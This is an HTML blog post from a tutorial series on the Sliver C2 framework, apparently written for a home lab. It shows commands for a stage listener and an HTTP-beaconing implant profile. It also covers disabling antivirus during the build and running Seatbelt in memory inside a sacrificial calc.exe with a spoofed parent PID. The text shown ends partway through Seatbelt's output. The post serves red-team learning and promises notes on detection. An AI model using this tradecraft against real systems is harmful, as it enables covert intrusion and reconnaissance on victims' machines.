@@ -1,0 +1,1523 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta name="generator" content="Hugo 0.101.0" />
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Learning Sliver C2 (09) - Execute Assembly | text/plain</title>
+    <meta name="description" content="Deep-dive into the execute-assembly command Sliver provides for .NET assembly execution.
+I show how to use the command as well as how it works under the hood (Donut).
+On top there are some notes on detection.
+">
+    <meta name="keywords" content="c2, sliver, tutorial, implant, execute-assembly, donut">
+    
+    
+    
+    
+    
+
+  <meta name="author" content="Dominic Breuker">
+
+
+    <meta property="og:title" content="Learning Sliver C2 (09) - Execute Assembly" />
+<meta property="og:description" content="Deep-dive into the execute-assembly command Sliver provides for .NET assembly execution.
+I show how to use the command as well as how it works under the hood (Donut).
+On top there are some notes on detection.
+" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://dominicbreuker.com/post/learning_sliver_c2_09_execute_assembly/" /><meta property="og:image" content="https://dominicbreuker.com/img/avatar.png"/><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2022-11-06T00:00:00+00:00" />
+<meta property="article:modified_time" content="2022-11-06T00:00:00+00:00" />
+
+
+    
+
+
+
+  <meta property="og:image" content="img/avatar.png">
+
+
+    <meta name="theme-color" content="#000">
+
+    
+    
+    
+    
+    <link rel="canonical" href="https://dominicbreuker.com/post/learning_sliver_c2_09_execute_assembly/">
+    
+    
+    <link rel="icon" sizes="any" href="data:image/svg+xml,%3Csvg%20viewBox='0%200%2046%2045'%20xmlns='http://www.w3.org/2000/svg'%3E%3Ctitle%3EAfter%20Dark%3C/title%3E%3Cpath%20d='M.708%2045L23%20.416%2045.292%2045H.708zM35%2038L23%2019%2011%2038h24z'%20fill='%23000'/%3E%3C/svg%3E">
+
+    <style>
+  html{font-size:12px}*{box-sizing:border-box;text-rendering:geometricPrecision}body{font-size:1rem;line-height:1.5rem;margin:0;font-family:Menlo,Monaco,Lucida Console,Liberation Mono,DejaVu Sans Mono,Bitstream Vera Sans Mono,Courier New,monospace,serif;word-wrap:break-word}h1,h2,h3,h4,h5,h6{line-height:1.3em}fieldset{border:none;padding:0;margin:0}pre{padding:2rem;margin:1.75rem 0;background-color:#fff;border:1px solid #ccc;overflow:auto}code[class*=language-],pre[class*=language-],pre code{font-weight:100;text-shadow:none;margin:1.75rem 0}a{cursor:pointer;color:#ff2e88;text-decoration:none;border-bottom:1px solid #ff2e88}a:hover{background-color:#ff2e88;color:#fff}.grid{display:-ms-flexbox;display:flex;-ms-flex-wrap:wrap;flex-wrap:wrap}.grid.\-top{-ms-flex-align:start;-ms-grid-row-align:flex-start;align-items:flex-start}.grid.\-middle{-ms-flex-align:center;-ms-grid-row-align:center;align-items:center}.grid.\-bottom{-ms-flex-align:end;-ms-grid-row-align:flex-end;align-items:flex-end}.grid.\-stretch{-ms-flex-align:stretch;-ms-grid-row-align:stretch;align-items:stretch}.grid.\-baseline{-ms-flex-align:baseline;-ms-grid-row-align:baseline;align-items:baseline}.grid.\-left{-ms-flex-pack:start;justify-content:flex-start}.grid.\-center{-ms-flex-pack:center;justify-content:center}.grid.\-right{-ms-flex-pack:end;justify-content:flex-end}.grid.\-between{-ms-flex-pack:justify;justify-content:space-between}.grid.\-around{-ms-flex-pack:distribute;justify-content:space-around}.cell{-ms-flex:1;flex:1;box-sizing:border-box}@media screen and (min-width:768px){.cell.\-1of12{-ms-flex:0 0 8.33333%;flex:0 0 8.33333%}.cell.\-2of12{-ms-flex:0 0 16.66667%;flex:0 0 16.66667%}.cell.\-3of12{-ms-flex:0 0 25%;flex:0 0 25%}.cell.\-4of12{-ms-flex:0 0 33.33333%;flex:0 0 33.33333%}.cell.\-5of12{-ms-flex:0 0 41.66667%;flex:0 0 41.66667%}.cell.\-6of12{-ms-flex:0 0 50%;flex:0 0 50%}.cell.\-7of12{-ms-flex:0 0 58.33333%;flex:0 0 58.33333%}.cell.\-8of12{-ms-flex:0 0 66.66667%;flex:0 0 66.66667%}.cell.\-9of12{-ms-flex:0 0 75%;flex:0 0 75%}.cell.\-10of12{-ms-flex:0 0 83.33333%;flex:0 0 83.33333%}.cell.\-11of12{-ms-flex:0 0 91.66667%;flex:0 0 91.66667%}}@media screen and (max-width:768px){.grid{-ms-flex-direction:column;flex-direction:column}.cell{-ms-flex:0 0 auto;flex:0 0 auto}}.hack,.hack blockquote,.hack code,.hack em,.hack h1,.hack h2,.hack h3,.hack h4,.hack h5,.hack h6,.hack strong{font-size:1rem;font-style:normal;font-family:Menlo,Monaco,Lucida Console,Liberation Mono,DejaVu Sans Mono,Bitstream Vera Sans Mono,Courier New,monospace,serif}.hack blockquote,.hack code,.hack em,.hack strong{line-height:20px}.hack blockquote,.hack code,.hack footer,.hack h1,.hack h2,.hack h3,.hack h4,.hack h5,.hack h6,.hack header,.hack li,.hack ol,.hack p,.hack section,.hack ul{float:none;margin:0;padding:0}.hack blockquote,.hack h1,.hack ol,.hack p,.hack ul{margin-top:20px;margin-bottom:20px}.hack h1{position:relative;display:inline-block;display:table-cell;padding:20px 0 30px;margin:0;overflow:hidden}.hack h1:after{content:"====================================================================================================";position:absolute;bottom:10px;left:0}.hack h1+*{margin-top:0}.hack h2,.hack h3,.hack h4,.hack h5,.hack h6{position:relative;margin-bottom:1.75rem}.hack h2:before,.hack h3:before,.hack h4:before,.hack h5:before,.hack h6:before{display:inline}.hack h2:before{content:"## "}.hack h3:before{content:"### "}.hack h4:before{content:"#### "}.hack h5:before{content:"##### "}.hack h6:before{content:"###### "}.hack li{position:relative;display:block;padding-left:20px}.hack li:after{position:absolute;top:0;left:0}.hack ul>li:after{content:"-"}.hack ol{counter-reset:a}.hack ol>li:after{content:counter(a) ".";counter-increment:a}.hack blockquote{position:relative;padding-left:17px;padding-left:2ch;overflow:hidden}.hack blockquote:after{content:">\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>";white-space:pre;position:absolute;top:0;left:0;line-height:20px}.hack em:after,.hack em:before{content:"*";display:inline}.hack pre code:after,.hack pre code:before{content:''}.hack code{font-weight:700}.hack code:after,.hack code:before{content:"`";display:inline}.hack hr{position:relative;height:20px;overflow:hidden;border:0;margin:20px 0}.hack hr:after{content:"----------------------------------------------------------------------------------------------------";position:absolute;top:0;left:0;line-height:20px;width:100%;word-wrap:break-word}@-moz-document url-prefix(){.hack h1{display:block}}.hack-ones ol>li:after{content:"1."}p{margin:0 0 1.75rem}.container{max-width:70rem}.container,.container-fluid{margin:0 auto;padding:0 1rem}.inner{padding:1rem}.inner2x{padding:2rem}.pull-left{float:left}.pull-right{float:right}.progress-bar{height:8px;opacity:.8;background-color:#ccc;margin-top:12px}.progress-bar.progress-bar-show-percent{margin-top:38px}.progress-bar-filled{background-color:gray;height:100%;transition:width .3s ease;position:relative;width:0}.progress-bar-filled:before{content:'';border:6px solid transparent;border-top-color:gray;position:absolute;top:-12px;right:-6px}.progress-bar-filled:after{color:gray;content:attr(data-filled);display:block;font-size:12px;white-space:nowrap;position:absolute;border:6px solid transparent;top:-38px;right:0;-ms-transform:translateX(50%);transform:translateX(50%)}table{width:100%;border-collapse:collapse;margin:1.75rem 0;color:#778087}table td,table th{vertical-align:top;border:1px solid #ccc;line-height:15px;padding:10px}table thead th{font-size:10px}table tbody td:first-child{font-weight:700;color:#333}.form{width:30rem}.form-group{margin-bottom:1.75rem;overflow:auto}.form-group label{border-bottom:2px solid #ccc;color:#333;width:10rem;display:inline-block;height:38px;line-height:38px;padding:0;float:left;position:relative}.form-group.form-success label{color:#4caf50!important;border-color:#4caf50!important}.form-group.form-warning label{color:#ff9800!important;border-color:#ff9800!important}.form-group.form-error label{color:#f44336!important;border-color:#f44336!important}.form-control{outline:none;border:none;border-bottom:2px solid #ccc;padding:.5rem 0;width:20rem;height:38px;background-color:transparent}.form-control:focus{border-color:#555}.form-group.form-textarea label:after{position:absolute;content:'';width:2px;background-color:#fff;right:-2px;top:0;bottom:0}textarea.form-control{height:auto;resize:none;padding:1rem 0;border-bottom:2px solid #ccc;border-left:2px solid #ccc;padding:.5rem}select.form-control{border-radius:0;background-color:transparent;-webkit-appearance:none;-moz-appearance:none;-ms-appearance:none}.help-block{color:#999;margin-top:.5rem}.form-actions{margin-bottom:1.75rem}.btn{display:-ms-inline-flexbox;display:inline-flex;-ms-flex-align:center;align-items:center;-ms-flex-pack:center;justify-content:center;cursor:pointer;outline:none;padding:.65rem 2rem;font-size:1rem;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;position:relative;z-index:1}.btn:active{box-shadow:inset 0 1px 3px rgba(0,0,0,.12)}.btn.btn-ghost{border-color:#757575;color:#757575;background-color:transparent}.btn.btn-ghost:focus,.btn.btn-ghost:hover{border-color:#424242;color:#424242;z-index:2}.btn.btn-ghost:hover{background-color:transparent}.btn-block{width:100%;display:-ms-flexbox;display:flex}.btn-default{color:#fff;background-color:#e0e0e0;border:1px solid #e0e0e0;color:#333}.btn-default:focus:not(.btn-ghost),.btn-default:hover{background-color:#dcdcdc;border-color:#dcdcdc}.btn-success{color:#fff;background-color:#4caf50;border:1px solid #4caf50}.btn-success:focus:not(.btn-ghost),.btn-success:hover{background-color:#43a047;border-color:#43a047}.btn-success.btn-ghost{border-color:#4caf50;color:#4caf50}.btn-success.btn-ghost:focus,.btn-success.btn-ghost:hover{border-color:#388e3c;color:#388e3c;z-index:2}.btn-error{color:#fff;background-color:#f44336;border:1px solid #f44336}.btn-error:focus:not(.btn-ghost),.btn-error:hover{background-color:#e53935;border-color:#e53935}.btn-error.btn-ghost{border-color:#f44336;color:#f44336}.btn-error.btn-ghost:focus,.btn-error.btn-ghost:hover{border-color:#d32f2f;color:#d32f2f;z-index:2}.btn-warning{color:#fff;background-color:#ff9800;border:1px solid #ff9800}.btn-warning:focus:not(.btn-ghost),.btn-warning:hover{background-color:#fb8c00;border-color:#fb8c00}.btn-warning.btn-ghost{border-color:#ff9800;color:#ff9800}.btn-warning.btn-ghost:focus,.btn-warning.btn-ghost:hover{border-color:#f57c00;color:#f57c00;z-index:2}.btn-info{color:#fff;background-color:#00bcd4;border:1px solid #00bcd4}.btn-info:focus:not(.btn-ghost),.btn-info:hover{background-color:#00acc1;border-color:#00acc1}.btn-info.btn-ghost{border-color:#00bcd4;color:#00bcd4}.btn-info.btn-ghost:focus,.btn-info.btn-ghost:hover{border-color:#0097a7;color:#0097a7;z-index:2}.btn-primary{color:#fff;background-color:#2196f3;border:1px solid #2196f3}.btn-primary:focus:not(.btn-ghost),.btn-primary:hover{background-color:#1e88e5;border-color:#1e88e5}.btn-primary.btn-ghost{border-color:#2196f3;color:#2196f3}.btn-primary.btn-ghost:focus,.btn-primary.btn-ghost:hover{border-color:#1976d2;color:#1976d2;z-index:2}.btn-group{overflow:auto}.btn-group .btn{float:left}.btn-group .btn-ghost:not(:first-child){margin-left:-1px}.card{border:1px solid #ccc}.card .card-header{color:#333;text-align:center;background-color:#ddd;padding:.5rem 0}.alert{color:#ccc;padding:1rem;border:1px solid #ccc;margin-bottom:1.75rem}.alert-success{color:#4caf50;border-color:#4caf50}.alert-error{color:#f44336;border-color:#f44336}.alert-info{color:#00bcd4;border-color:#00bcd4}.alert-warning{color:#ff9800;border-color:#ff9800}.media:not(:last-child){margin-bottom:1.25rem}.media-left{padding-right:1rem}.media-left,.media-right{display:table-cell;vertical-align:top}.media-right{padding-left:1rem}.media-body{display:table-cell;vertical-align:top}.media-heading{font-size:1.16667rem;font-weight:700}.media-content{margin-top:.3rem}.avatarholder,.placeholder{background-color:#f0f0f0;text-align:center;color:#b9b9b9;font-size:1rem;border:1px solid #f0f0f0}.avatarholder{width:48px;height:48px;line-height:46px;font-size:2rem;background-size:cover;background-position:50%;background-repeat:no-repeat}.avatarholder.rounded{border-radius:33px}.loading{display:inline-block;content:'&nbsp;';height:20px;width:20px;margin:0 .5rem;animation:a .6s infinite linear;border:2px solid #e91e63;border-right-color:transparent;border-radius:50%}.btn .loading{margin-bottom:0;width:14px;height:14px}.btn div.loading{float:left}.alert .loading{margin-bottom:-5px}@keyframes a{0%{transform:rotate(0deg)}to{transform:rotate(1turn)}}.menu{width:100%}.menu .menu-item{display:block;color:#616161;border-color:#616161}.menu .menu-item.active,.menu .menu-item:hover{color:#000;border-color:#000;background-color:transparent}@media screen and (max-width:768px){.form-group label{display:block;border-bottom:none;width:100%}.form-group.form-textarea label:after{display:none}.form-control{width:100%}textarea.form-control{border-left:none;padding:.5rem 0}pre::-webkit-scrollbar{height:3px}}@media screen and (max-width:480px){.form{width:100%}}.dark{color:#ccc}.dark,.dark pre{background-color:#000}.dark pre{padding:0;border:none}.dark pre code{color:#00bcd4}.dark h1 a,.dark h2 a,.dark h3 a,.dark h4 a,.dark h5 a{color:#ccc}.dark code,.dark strong{color:#fff}.dark code{font-weight:100}.dark table{color:#ccc}.dark table td,.dark table th{border-color:#444}.dark table tbody td:first-child{color:#fff}.dark .form-group label{color:#ccc;border-color:rgba(95,95,95,.78)}.dark .form-group.form-textarea label:after{background-color:#000}.dark .form-control{color:#ccc;border-color:rgba(95,95,95,.78)}.dark .form-control:focus{border-color:#ccc;color:#ccc}.dark textarea.form-control{color:#ccc}.dark .card{border-color:rgba(95,95,95,.78)}.dark .card .card-header{background-color:transparent;color:#ccc;border-bottom:1px solid rgba(95,95,95,.78)}.dark .btn.btn-ghost.btn-default{border-color:#ababab;color:#ababab}.dark .btn.btn-ghost.btn-default:focus,.dark .btn.btn-ghost.btn-default:hover{border-color:#9c9c9c;color:#9c9c9c;z-index:1}.dark .btn.btn-ghost.btn-default:focus,.dark .btn.btn-ghost.btn-default:hover{border-color:#e0e0e0;color:#e0e0e0}.dark .btn.btn-ghost.btn-primary:focus,.dark .btn.btn-ghost.btn-primary:hover{border-color:#64b5f6;color:#64b5f6}.dark .btn.btn-ghost.btn-success:focus,.dark .btn.btn-ghost.btn-success:hover{border-color:#81c784;color:#81c784}.dark .btn.btn-ghost.btn-info:focus,.dark .btn.btn-ghost.btn-info:hover{border-color:#4dd0e1;color:#4dd0e1}.dark .btn.btn-ghost.btn-error:focus,.dark .btn.btn-ghost.btn-error:hover{border-color:#e57373;color:#e57373}.dark .btn.btn-ghost.btn-warning:focus,.dark .btn.btn-ghost.btn-warning:hover{border-color:#ffb74d;color:#ffb74d}.dark .avatarholder,.dark .placeholder{background-color:transparent;border-color:#333}.dark .menu .menu-item{color:#ccc;border-color:rgba(95,95,95,.78)}.dark .menu .menu-item.active,.dark .menu .menu-item:hover{color:#fff;border-color:#ccc}
+  :root {
+  --screen-size-small: 30em; /* breakpoint reference only */
+}
+@keyframes intro {
+  0% {
+    opacity: 0;
+  }
+  100% {
+    opacity: 1;
+  }
+}
+.muted {
+  color: rgba(255, 255, 255, 0.5);
+}
+.readmore {
+  margin-bottom: 2.2em;
+}
+.responsive-iframe {
+  position: relative;
+  padding-bottom: 56.25%; /* 16:9 */
+  padding-top: 25px;
+  height: 0;
+}
+.responsive-iframe iframe {
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+}
+iframe {
+  border: 0;
+}
+main, footer {
+  animation: intro 0.3s both;
+  animation-delay: 0.15s;
+}
+footer time[datetime$="M"]:before {
+  content: "\2013\0020";
+}
+@media only screen
+  and ( max-width: 30em ) {
+  footer time[datetime$="M"] {
+    display: none;
+  }
+}
+blockquote cite {
+  display: block;
+}
+blockquote cite::before {
+   content: "\2014";
+}
+:target {
+  color: #fff;
+}
+/* hack.css overrides and enhancements */
+.hack li ul {
+  margin: 0;
+}
+.main {
+  padding: 20px 10px;
+}
+nav a.active {
+  background-color: #ff2e88;
+  color: #fff;
+}
+a[itemprop="url"] {
+  color: #ff9800;
+}
+a[itemprop="url"]:hover {
+  color: #fff;
+}
+a[href*="://"]::after,
+a[rel*="external"] {
+  content: " " url("data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20class='i-external'%20viewBox='0%200%2032%2032'%20width='14'%20height='14'%20fill='none'%20stroke='%23ff9800'%20stroke-linecap='round'%20stroke-linejoin='round'%20stroke-width='9.38%'%3E%3Cpath%20d='M14%209%20L3%209%203%2029%2023%2029%2023%2018%20M18%204%20L28%204%2028%2014%20M28%204%20L14%2018'/%3E%3C/svg%3E");
+}
+figure a[href*="://"]::after,
+figure a[rel*="external"] {
+  content: "";
+}
+html {
+  font-size: 13px;
+}
+.hack pre {
+  font-size: 17px;
+}
+article [itemprop="description"] {
+  margin-bottom: 20px;
+  margin-top: 20px;
+}
+@media screen and (min-width: 768px) {
+  html {
+    font-size: 1em;
+  }
+  .container {
+    max-width: 50rem;
+  }
+}
+
+  nav a.active {
+  background-color: #33cc33; /*ff2e88*/
+  color: #fff;
+}
+a[itemprop="url"] {
+  color: #339933; /*ff9800*/
+}
+a[itemprop="url"]:hover {
+  color: #fff;
+  background-color: #33cc33; /*ff2e88*/
+}
+
+.dark pre code {
+  color: #248f24;
+}
+
+.dark code {
+  color: #248f24;
+}
+
+a {
+  color: #339933; /*ff9800*/
+  border-bottom: 1px solid #33cc33;
+}
+
+a:hover {
+  color: #fff;
+  background-color: #33cc33; /*ff2e88*/
+}
+
+/* custom styles */
+figure {
+  margin-left: auto;
+  margin-right: auto;
+  text-align: center;
+}
+figure img {
+  max-width: 100%;
+}
+figure a {
+  border-bottom: none !important;
+}
+figure a:hover {
+  background-color: inherit !important;
+}
+
+</style>
+
+    
+    
+      <script async src="/js/lazysizes.min.js"></script>
+    
+    
+      <script async src="/js/bpgdec8a.js"></script>
+      <script async src="/js/bpgdec8.js"></script>
+      <script async src="/js/bpgdec.js"></script>
+    
+  </head>
+  
+  <body class="hack dark main container">
+    <header>
+  
+  <nav itemscope itemtype="http://schema.org/SiteNavigationElement">
+    
+    
+      <a itemprop="url" class="" href="/"><span itemprop="name">Home</span></a>
+    
+      <a itemprop="url" class="" href="/post/"><span itemprop="name">Post</span></a>
+    
+      <a itemprop="url" class="" href="/about/"><span itemprop="name">About</span></a>
+    
+  </nav>
+
+
+</header>
+    <main>
+  <article itemscope itemtype="http://schema.org/BlogPosting">
+    <meta itemprop="name" content="Learning Sliver C2 (09) - Execute Assembly">
+<meta itemprop="description" content="Deep-dive into the execute-assembly command Sliver provides for .NET assembly execution.
+I show how to use the command as well as how it works under the hood (Donut).
+On top there are some notes on detection.
+"><meta itemprop="datePublished" content="2022-11-06T00:00:00+00:00" />
+<meta itemprop="dateModified" content="2022-11-06T00:00:00+00:00" />
+<meta itemprop="wordCount" content="5813"><meta itemprop="image" content="https://dominicbreuker.com/img/avatar.png"/>
+<meta itemprop="keywords" content="c2,sliver,tutorial,implant,execute-assembly,donut," />
+    <script async src="/js/baffle.js"></script>
+    <header>
+      <h1 class="baffle" itemprop="headline">Learning Sliver C2 (09) - Execute Assembly</h1>
+      <p class="muted">
+        <svg style="margin-bottom:-3px" class="i-clock" viewBox="0 0 32 32" width="16" height="16" fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
+  <circle cx="16" cy="16" r="14" />
+  <path d="M16 8 L16 16 20 20" />
+</svg>
+<span>28 minute read</span>
+<svg style="margin-bottom: -3px" class="i-edit" viewBox="0 0 32 32" width="16" height="16" fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
+  <path d="M30 7 L25 2 5 22 3 29 10 27 Z M21 6 L26 11 Z M5 22 L10 27 Z" />
+</svg>
+
+  Published: <time datetime="2022-11-06T00:00:00&#43;00:00">6 Nov, 2022</time>
+
+
+      </p>
+    </header>
+    
+      <blockquote itemprop="description">Deep-dive into the execute-assembly command Sliver provides for .NET assembly execution.
+I show how to use the command as well as how it works under the hood (Donut).
+On top there are some notes on detection.
+</blockquote>
+    
+    
+  <details>
+    <summary>Table of Contents</summary>
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#introduction">Introduction</a></li>
+    <li><a href="#preparations">Preparations</a></li>
+    <li><a href="#execute-assembly">Execute Assembly</a></li>
+    <li><a href="#implementation-details">Implementation details</a>
+      <ul>
+        <li><a href="#sliver-source-code">Sliver source code</a></li>
+        <li><a href="#using-donut-manually">Using Donut manually</a></li>
+        <li><a href="#inside-donut">Inside Donut</a></li>
+      </ul>
+    </li>
+    <li><a href="#detection">Detection</a></li>
+  </ul>
+</nav>
+  </details>
+  <script>
+    const el = document.querySelector('details summary')
+    el.onclick = () => {
+      (function(l,o,a,d,e,r){e=o.createElement(a),r=o.getElementsByTagName(a)[0];e.async=1;e.src=d;r.parentNode.insertBefore(e,r)})(window,document,'script','/js/smoothscroll.js');
+      el.onclick = null
+    }
+    document.querySelectorAll('#TableOfContents a').forEach(link => {
+      link.addEventListener('click', () => {
+        document.querySelector(
+          link.href.slice(link.href.indexOf('#'))
+        ).scrollIntoView({ behavior: 'smooth' })
+      })
+    })
+  </script>
+
+
+    <div itemprop="articleBody">
+      <h1 id="sliver-c2">Sliver C2</h1>
+<p>This post is part of a tutorial blog post series on Sliver C2 (currently on v1.5.30).
+For an overview: <a href="../../post/learning_sliver_c2_01_installation/">click here</a>.</p>
+<h2 id="introduction">Introduction</h2>
+<p>We went through the most basic implant commands in <a href="../../post/learning_sliver_c2_08_implant_basics/">post 8</a>,
+but sometimes you may want to do a bit more than just that.
+Its great that your Sliver implant can read files or registry keys but
+it would be better if you could use it as a launchpad for all of the
+sophisticated attack tools that already exist out there.
+Sliver calls them 3rd party tools and fortunately provides at least three ways to run them
+(<a href="https://github.com/BishopFox/sliver/wiki/Using-3rd-party-tools">wiki</a>).</p>
+<p>This post is about the first of those three ways.
+The command for it is called <code>execute-assembly</code> and runs
+more or less any .NET assembly, be it an executable or a DLL.
+You can provide arbitrary arguments for executables or
+alternatively a class, method and arguments for DLLs.
+Once the assembly finishes executing, you get its stdout and stderr outputs back.</p>
+<p>Execution happens completely in memory.
+That is, the assembly is never written anywhere to disk on the target machine.
+Instead, it is executed in one of two ways.
+You can make <code>execute-assembly</code> launch a new &ldquo;sacrificial process&rdquo; created off of
+some executable already on the target&rsquo;s disk (does not have to be a .NET assembly).
+It will then inject your .NET assembly into that process and terminate it afterwards.
+Alternatively, you can execute the .NET assembly within the process that also hosts your implant.</p>
+<p>How is it possible to run a .NET assembly as part of arbitrary processes?
+I&rsquo;ll have a closer look at that later in this post, but the short version is as follows:
+For the sacrificial process, the .NET assembly is first turned into position-independent
+shellcode using a tool called <a href="https://github.com/thewover/donut">Donut</a>, then injected
+into that process. For in-process execution, a library called <a href="https://github.com/Ne0nd0g/go-clr">go-clr</a>
+is used. It should more or less do the same thing Donut does
+but is written in Go rather than shellcode and can thus be compiled into the implant.</p>
+<p>The outline for the remainder of this post is as follows.
+I&rsquo;ll first demonstrate <code>execute-assembly</code> by running the well-known tool
+<a href="https://github.com/GhostPack/Seatbelt">Seatbelt</a> with it.
+After that there will be a short discussion of the code with some implementation details.
+Based on that, I&rsquo;ll follow up with reproducing the functionality of <code>execute-assembly</code> manually,
+just to make sure I understood it correctly and to solidify that understanding.
+There will also be a brief and somewhat superficial discussion of the inner workings of Donut
+as well as some notes on how <code>execute-assembly</code> could be detected.</p>
+<p>As usual though, there are first some hints for preparation in case you want to reproduce in a lab
+similar to mine.</p>
+<h2 id="preparations">Preparations</h2>
+<p>I have a lab environment with the following hosts:</p>
+<ul>
+<li>a target running Windows which we want to infect (192.168.122.32)
+and which also serves as a Windows development machine (Visual Studio installed),</li>
+<li>a Sliver C2 server generating implant shellcode and running stage listeners (192.168.122.111 / sliver.labnet.local)</li>
+<li>a proxy server running Squid and a DNS service to resolve domain names in the lab (192.168.122.185)</li>
+</ul>
+<p>Posts
+<a href="../../post/learning_sliver_c2_01_installation/">1</a> to
+<a href="../../post/learning_sliver_c2_05_transports_in_detail_dns/">5</a>
+show how I created it, but details don&rsquo;t matter too much here.</p>
+<p>All you need to follow along the rest of the post is a Windows target running a Sliver beacon implant
+which connects to your C2 server.
+I assume you are able to do that.
+If not, read <a href="../../post/learning_sliver_c2_06_stagers_process_injection">post 7</a>
+and get a stager running.</p>
+<p>To prepare, connect to your Sliver console and set up a stage listener.
+You can create your implant profile with <code>profiles new beacon --http sliver.labnet.local?driver=wininet --seconds 5 --jitter 0 --skip-symbols --format shellcode --arch amd64 win64http</code>
+(unless you already have one), then start the listener:</p>
+<pre tabindex="0"><code>sliver &gt; stage-listener --url http://sliver.labnet.local:80 --profile win64http
+
+[*] No builds found for profile win64http, generating a new one
+[*] Job 1 (http) started
+
+sliver &gt;  jobs
+
+ ID   Name   Protocol   Port 
+==== ====== ========== ======
+ 1    http   tcp        80
+</code></pre><p>Then run a stager or get the implant running in any other way.
+My stager injects into <code>msedge.exe</code>, the Edge browser.
+So now you should have an active beacon.</p>
+<h2 id="execute-assembly">Execute Assembly</h2>
+<p>To execute a Seatbelt .NET assembly, we obviously need that file somewhere on our attack machine.
+Since no compiled assemblies are available for download we&rsquo;ll have to build one ourselves.
+Fortunately, this is easy to do.
+You need the source code from <a href="https://github.com/GhostPack/Seatbelt">github.com/GhostPack/Seatbelt</a>
+checked out on your Windows machine.
+Then open the solution in Visual Studio.
+In my special case, it asked to update the solution to .NET 4, which I did.
+This seems to break backward-compatibility with old OS&rsquo;s like Windows 7 but avoids the next mega-download.
+Fine for my lab, maybe not so fine for some corporate environments.
+Anyways, decide for yourself and then choose &ldquo;Release&rdquo; and hit &ldquo;Build&rdquo; -&gt; &ldquo;Build Solution&rdquo; from the menu at the top.
+The build log will show you where to find the assembly:</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/32_sliver_c2_execute_assembly/building_seatbelt.png"  />
+    
+  
+  
+  <figcaption>
+    <header><b>Building an executable Seatbelt assembly</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<p>Ensure you have AV disabled during build or configure an exception.
+Forget it and Defender will delete your binary as it get&rsquo;s written.</p>
+<p>Just to make sure it worked, you may want to run Seatbelt now.
+Paranoid people test often (<a href="https://www.martinfowler.com/ieeeSoftware/failFast.pdf">fail fast</a>).
+To use run, open a terminal window and run it with <code>seatbelt.exe -group=user</code>,
+which runs only a few checks that should complete quickly:</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/32_sliver_c2_execute_assembly/seatbelt_runs_locally.png"  />
+    
+  
+  
+  <figcaption>
+    <header><b>Seatbelt running locally in a terminal window</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<p>Now get that assembly over to your C2 server.
+I do that with an SMB share to which I connect with <code>impacket-smbclient</code>.
+I&rsquo;m sure you&rsquo;ll get that done somehow.</p>
+<p>Now you are ready to run the thing.
+Connect to your Sliver console, select your current beacon and then use <code>execute-assembly</code>.
+Here I&rsquo;ll use it in the &ldquo;sacrificial process&rdquo; way.
+That is, I let it launch &ldquo;calc.exe&rdquo; and inject Seatbelt into it.</p>
+<p>To make it look as normal as possible, you can spoof the parent process ID (PPID) of the
+&ldquo;calc.exe&rdquo; process you start.
+If started by a user in the normal way, it would be a child process of &ldquo;explorer.exe&rdquo;,
+so we should use the PID of this process as the PPID.
+Use <code>ps</code> to find the PID of <code>explorer.exe</code> (see also <a href="../../post/learning_sliver_c2_08_implant_basics/">post 8</a>,
+but its really not that hard).
+Then pass this PID as the <code>--ppid</code> argument and &ldquo;calc.exe&rdquo; as the <code>--process</code> argument.</p>
+<p>My explorer PID was <code>4272</code> so I used the following command:</p>
+<pre tabindex="0"><code>sliver (LIABLE_EX-WIFE) &gt; execute-assembly --ppid 4272 --process calc.exe --loot --name seatbelt /tmp/ghostpack/Seatbelt.exe -group=All
+
+[*] Tasked beacon LIABLE_EX-WIFE (e751b83a)
+
+[+] LIABLE_EX-WIFE completed task e751b83a
+
+[*] Output:
+
+
+                        %&amp;&amp;@@@&amp;&amp;                                                                                  
+                        &amp;&amp;&amp;&amp;&amp;&amp;&amp;%%%,                       #&amp;&amp;@@@@@@%%%%%%###############%                         
+                        &amp;%&amp;   %&amp;%%                        &amp;////(((&amp;%%%%%#%################//((((###%%%%%%%%%%%%%%%
+%%%%%%%%%%%######%%%#%%####%  &amp;%%**#                      @////(((&amp;%%%%%%######################(((((((((((((((((((
+#%#%%%%%%%#######%#%%#######  %&amp;%,,,,,,,,,,,,,,,,         @////(((&amp;%%%%%#%#####################(((((((((((((((((((
+#%#%%%%%%#####%%#%#%%#######  %%%,,,,,,  ,,.   ,,         @////(((&amp;%%%%%%%######################(#(((#(#((((((((((
+#####%%%####################  &amp;%%......  ...   ..         @////(((&amp;%%%%%%%###############%######((#(#(####((((((((
